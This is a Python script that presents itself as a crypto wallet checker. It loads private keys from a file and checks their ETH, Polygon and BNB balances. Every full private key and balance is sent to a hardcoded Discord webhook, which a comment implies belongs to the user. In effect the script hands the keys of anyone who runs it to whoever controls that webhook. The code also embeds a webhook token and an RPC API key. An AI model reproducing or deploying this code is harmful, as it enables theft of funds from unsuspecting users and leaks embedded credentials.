import secrets
import requests
import hashlib
from ecdsa import SigningKey, SECP256k1
import json
from concurrent.futures import ThreadPoolExecutor, as_completed
from eth_account import Account

# Your Discord Webhook (already inserted)
WEBHOOK_URL = "https://discord.com/api/webhooks/1370714262237876224/od1EsdVEJ869kBHZB7vqGqXjOM55pcaK9NbPf_J97AUY5GFnHrVsRVcO-qB0oXY_012a"

# Console Colors
RED = "\033[91m"
GREEN = "\033[92m"
RESET = "\033[0m"

# RPC Endpoints
RPC_ENDPOINTS = {
    "ETH": "https://eth-mainnet.g.alchemy.com/v2/kXg5eHzREfbkY0c7uxkdGOIRnjxHqby-",
    "POLYGON": "https://polygon-rpc.com",
    "BNB": "https://bsc-dataseed.binance.org/"
}

def get_balance(address, rpc_url):
    payload = {
        "jsonrpc":"2.0",
        "method":"eth_getBalance",
        "params":[address, "latest"],
        "id":1
    }
    try:
        response = requests.post(rpc_url, json=payload, timeout=10)
        result = int(response.json().get("result", "0x0"), 16) / 1e18
        return result
    except Exception as e:
        return None

def send_to_discord(message):
    data = {"content": message}
    try:
        requests.post(WEBHOOK_URL, json=data)
    except Exception as e:
        print(f"Failed to send to Discord: {e}")

def format_balance(label, balance):
    if balance is None:
        return f"{label}: ❌ Error"
    elif balance > 0:
        return f"{label}: {GREEN}{balance:.5f}{RESET}"
    else:
        return f"{label}: {RED}0{RESET}"

def check_key(key):
    try:
        acct = Account.from_key(key)
        address = acct.address

        eth_bal = get_balance(address, RPC_ENDPOINTS["ETH"])
        polygon_bal = get_balance(address, RPC_ENDPOINTS["POLYGON"])
        bnb_bal = get_balance(address, RPC_ENDPOINTS["BNB"])

        msg_console = f"{address}\n" \
                      f"{format_balance('ETH', eth_bal)}\n" \
                      f"{format_balance('MATIC', polygon_bal)}\n" \
                      f"{format_balance('BNB', bnb_bal)}\n" \
                      f"Private Key: ||{key}||"

        # Print to console with colors
        print(msg_console + "\n" + "-"*30)

        # Prepare Discord message (without ANSI colors)
        def clean_color(s):
            for c in [RED, GREEN, RESET]:
                s = s.replace(c, "")
            return s

        msg_discord = f"🔍 `{address}`\n" \
                      f"ETH: {'🟢' if eth_bal and eth_bal > 0 else '🔴'} {eth_bal if eth_bal is not None else 'Error'}\n" \
                      f"MATIC: {'🟢' if polygon_bal and polygon_bal > 0 else '🔴'} {polygon_bal if polygon_bal is not None else 'Error'}\n" \
                      f"BNB: {'🟢' if bnb_bal and bnb_bal > 0 else '🔴'} {bnb_bal if bnb_bal is not None else 'Error'}\n" \
                      f"Private Key: ||{key}||"

        send_to_discord(msg_discord)
        return True
    except Exception as e:
        print(f"Error checking key: {e}")
        send_to_discord(f"❌ Error checking key: {e}")
        return False

def main():
    with open("keys.txt", "r") as f:
        keys = [line.strip() for line in f if line.strip()]

    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = [executor.submit(check_key, key) for key in keys]

        for future in as_completed(futures):
            future.result()  # wait for each to finish

if __name__ == "__main__":
    main()
